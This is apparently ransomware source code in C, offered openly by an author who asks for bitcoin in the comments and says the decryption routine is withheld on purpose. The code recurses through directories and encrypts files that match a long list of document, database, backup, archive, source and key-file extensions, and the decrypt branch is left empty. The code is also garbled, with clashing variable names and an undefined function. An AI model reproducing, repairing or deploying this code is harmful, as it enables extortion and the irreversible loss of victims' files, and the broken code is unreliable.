/*
please dont spread this :(
if you do, give me some BTC! I LOVE MONEY!!!! :D
enc is encrypt
im not giving out decrypter here.... :P
*/
#define _CRT_SECURE_NO_WARNINGS
#include "hell.h"
#include "filerecursion.h"

//it works... just need to get refernce to name

void start(const char *lol, int lmao)
{
	DIR *directory = opendir(lol);
	if (errno == ENOTDIR){
		//manage the file then
		managefile(lol, lol, enc);
	}
	else if (errno != 2){
		//then directory? we should go into it
		itsadirectory(lol, enc);

	}
	else {
		//tf...
		printf("Not a valid directory or file name\n");

		return;
	}
	if (directory != 0)
		closedir(directory);
}








void itsadirectory(const char * lol, int enc)
{
	DIR *directory = opendir(lol);
	if (directory == 0){
		return;
	}
	struct dirent * directory;
	while ((directory = readdir(directory)) != NULL) {
		//path can't be longer than 1024 bytes
		char * pathtogold = calloc(1, 1024);
    //dname is file name >.>
		if ((strcmp(directory->d_name, ".") == 0) || (strcmp(directory->d_name, "..") == 0)){
			free(fullpath);
			continue;
		}
		strcpy(pathtogold, lol);
		strcat(pathtogold, "/");
		strcat(pathtogold, directory->d_name);
    //DT REG IS file!
		if (directory->d_type == DT_REG){
    //yaaa!! its a file :P lets check ending and encrypt!
			managefile(pathtogold, fDirent->d_name, enc);
		}
    //DT Dir is DIR
		else if (directory->d_type == DT_DIR){
			// :( its another directory 
      
      itsadirectory(pathtogold, enc);
		}
		free(fullpath);
	}
  //
	char * fullpath = calloc(1, 1024);
	strcpy(fullpath, lol);
	strcat(fullpath, "/");
//
	free(fullpath);

	closedir(directory);
}

char *gettheextension(const char *nameofthefile)
{
	char *extension = strrchr(nameofthefile, '.');
	if (!extension || extension == nameofthefile){
  return "";
	}
  return dot + 1;
}







void managefile(const char * locationtofile, const char * nameofthefile, int enc)
{


	char * file_ext = get_filename_ext(locationtofile);
//theres a better way to do this, im not releasing my way :)
//gotta save my good shit for myself
	if (strcmp(file_ext, "doc") == 0 || strcmp(file_ext, "docx") == 0 || strcmp(file_ext, "xls") == 0 || strcmp(file_ext, "xlsx") == 0 || strcmp(file_ext, "ppt") == 0 || strcmp(file_ext, "pptx") == 0 || strcmp(file_ext, "pst") == 0 || strcmp(file_ext, "ost") == 0 || strcmp(file_ext, "msg") == 0 || strcmp(file_ext, "eml") == 0 || strcmp(file_ext, "vsd") == 0 || strcmp(file_ext, "vsdx") == 0 || strcmp(file_ext, "txt") == 0 || strcmp(file_ext, "csv") == 0 || strcmp(file_ext, "rtf") == 0 || strcmp(file_ext, "123") == 0 || strcmp(file_ext, "wks") == 0 || strcmp(file_ext, "wk1") == 0 || strcmp(file_ext, "pdf") == 0 || strcmp(file_ext, "dwg") == 0 || strcmp(file_ext, "onetoc2") == 0 || strcmp(file_ext, "snt") == 0 || strcmp(file_ext, "jpeg") == 0 || strcmp(file_ext, "jpg") == 0 || strcmp(file_ext, "docb") == 0 || strcmp(file_ext, "docm") == 0 || strcmp(file_ext, "dot") == 0 || strcmp(file_ext, "dotm") == 0 || strcmp(file_ext, "dotx") == 0 || strcmp(file_ext, "xlsm") == 0 || strcmp(file_ext, "xlsb") == 0 || strcmp(file_ext, "xlw") == 0 || strcmp(file_ext, "xlt") == 0 || strcmp(file_ext, "xlm") == 0 || strcmp(file_ext, "xlc") == 0 || strcmp(file_ext, "xltx") == 0 || strcmp(file_ext, "xltm") == 0 || strcmp(file_ext, "pptm") == 0 || strcmp(file_ext, "pot") == 0 || strcmp(file_ext, "pps") == 0 || strcmp(file_ext, "ppsm") == 0 || strcmp(file_ext, "ppsx") == 0 || strcmp(file_ext, "ppam") == 0 || strcmp(file_ext, "potx") == 0 || strcmp(file_ext, "potm") == 0 || strcmp(file_ext, "edb") == 0 || strcmp(file_ext, "hwp") == 0 || strcmp(file_ext, "602") == 0 || strcmp(file_ext, "sxi") == 0 || strcmp(file_ext, "sti") == 0 || strcmp(file_ext, "sldx") == 0 || strcmp(file_ext, "sldm") == 0 || strcmp(file_ext, "sldm") == 0 || strcmp(file_ext, "vdi") == 0 || strcmp(file_ext, "vmdk") == 0 || strcmp(file_ext, "vmx") == 0 || strcmp(file_ext, "gpg") == 0 || strcmp(file_ext, "aes") == 0 || strcmp(file_ext, "ARC") == 0 || strcmp(file_ext, "PAQ") == 0 || strcmp(file_ext, "bz2") == 0 || strcmp(file_ext, "tbk") == 0 || strcmp(file_ext, "bak") == 0 || strcmp(file_ext, "tar") == 0 || strcmp(file_ext, "tgz") == 0 || strcmp(file_ext, "gz") == 0 || strcmp(file_ext, "7z") == 0 || strcmp(file_ext, "rar") == 0 || strcmp(file_ext, "zip") == 0 || strcmp(file_ext, "backup") == 0 || strcmp(file_ext, "iso") == 0 || strcmp(file_ext, "vcd") == 0 || strcmp(file_ext, "bmp") == 0 || strcmp(file_ext, "png") == 0 || strcmp(file_ext, "gif") == 0 || strcmp(file_ext, "raw") == 0 || strcmp(file_ext, "cgm") == 0 || strcmp(file_ext, "tif") == 0 || strcmp(file_ext, "tiff") == 0 || strcmp(file_ext, "nef") == 0 || strcmp(file_ext, "psd") == 0 || strcmp(file_ext, "ai") == 0 || strcmp(file_ext, "svg") == 0 || strcmp(file_ext, "djvu") == 0 || strcmp(file_ext, "m4u") == 0 || strcmp(file_ext, "m3u") == 0 || strcmp(file_ext, "mid") == 0 || strcmp(file_ext, "wma") == 0 || strcmp(file_ext, "flv") == 0 || strcmp(file_ext, "3g2") == 0 || strcmp(file_ext, "mkv") == 0 || strcmp(file_ext, "3gp") == 0 || strcmp(file_ext, "mp4") == 0 || strcmp(file_ext, "mov") == 0 || strcmp(file_ext, "avi") == 0 || strcmp(file_ext, "asf") == 0 || strcmp(file_ext, "mpeg") == 0 || strcmp(file_ext, "vob") == 0 || strcmp(file_ext, "mpg") == 0 || strcmp(file_ext, "wmv") == 0 || strcmp(file_ext, "fla") == 0 || strcmp(file_ext, "swf") == 0 || strcmp(file_ext, "wav") == 0 || strcmp(file_ext, "mp3") == 0 || strcmp(file_ext, "sh") == 0 || strcmp(file_ext, "class") == 0 || strcmp(file_ext, "jar") == 0 || strcmp(file_ext, "java") == 0 || strcmp(file_ext, "rb") == 0 || strcmp(file_ext, "asp") == 0 || strcmp(file_ext, "php") == 0 || strcmp(file_ext, "jsp") == 0 || strcmp(file_ext, "brd") == 0 || strcmp(file_ext, "sch") == 0 || strcmp(file_ext, "dch") == 0 || strcmp(file_ext, "dip") == 0 || strcmp(file_ext, "pl") == 0 || strcmp(file_ext, "vb") == 0 || strcmp(file_ext, "vbs") == 0 || strcmp(file_ext, "ps1") == 0 || strcmp(file_ext, "bat") == 0 || strcmp(file_ext, "cmd") == 0 || strcmp(file_ext, "js") == 0 || strcmp(file_ext, "asm") == 0 || strcmp(file_ext, "h") == 0 || strcmp(file_ext, "pas") == 0 || strcmp(file_ext, "cpp") == 0 || strcmp(file_ext, "c") == 0 || strcmp(file_ext, "cs") == 0 || strcmp(file_ext, "suo") == 0 || strcmp(file_ext, "sln") == 0 || strcmp(file_ext, "ldf") == 0 || strcmp(file_ext, "mdf") == 0 || strcmp(file_ext, "ibd") == 0 || strcmp(file_ext, "myi") == 0 || strcmp(file_ext, "myd") == 0 || strcmp(file_ext, "frm") == 0 || strcmp(file_ext, "odb") == 0 || strcmp(file_ext, "dbf") == 0 || strcmp(file_ext, "db") == 0 || strcmp(file_ext, "mdb") == 0 || strcmp(file_ext, "accdb") == 0 || strcmp(file_ext, "sql") == 0 || strcmp(file_ext, "sqlitedb") == 0 || strcmp(file_ext, "sqlite3") == 0 || strcmp(file_ext, "asc") == 0 || strcmp(file_ext, "lay6") == 0 || strcmp(file_ext, "lay") == 0 || strcmp(file_ext, "mml") == 0 || strcmp(file_ext, "sxm") == 0 || strcmp(file_ext, "otg") == 0 || strcmp(file_ext, "odg") == 0 || strcmp(file_ext, "uop") == 0 || strcmp(file_ext, "std") == 0 || strcmp(file_ext, "sxd") == 0 || strcmp(file_ext, "otp") == 0 || strcmp(file_ext, "odp") == 0 || strcmp(file_ext, "wb2") == 0 || strcmp(file_ext, "slk") == 0 || strcmp(file_ext, "dif") == 0 || strcmp(file_ext, "stc") == 0 || strcmp(file_ext, "sxc") == 0 || strcmp(file_ext, "ots") == 0 || strcmp(file_ext, "ods") == 0 || strcmp(file_ext, "3dm") == 0 || strcmp(file_ext, "max") == 0 || strcmp(file_ext, "3ds") == 0 || strcmp(file_ext, "uot") == 0 || strcmp(file_ext, "stw") == 0 || strcmp(file_ext, "sxw") == 0 || strcmp(file_ext, "ott") == 0 || strcmp(file_ext, "odt") == 0 || strcmp(file_ext, "pem") == 0 || strcmp(file_ext, "p12") == 0 || strcmp(file_ext, "csr") == 0 || strcmp(file_ext, "crt") == 0 || strcmp(file_ext, "key") == 0 || strcmp(file_ext, "pfx") == 0 || strcmp(file_ext, "der") == 0)
	{
		if (enc == ENCRYPT) {
			encrypt_file(locationtofile, enc);

		}
if(enc== DECRYPT){
//heh you thought id give this free :D
}
	}

}
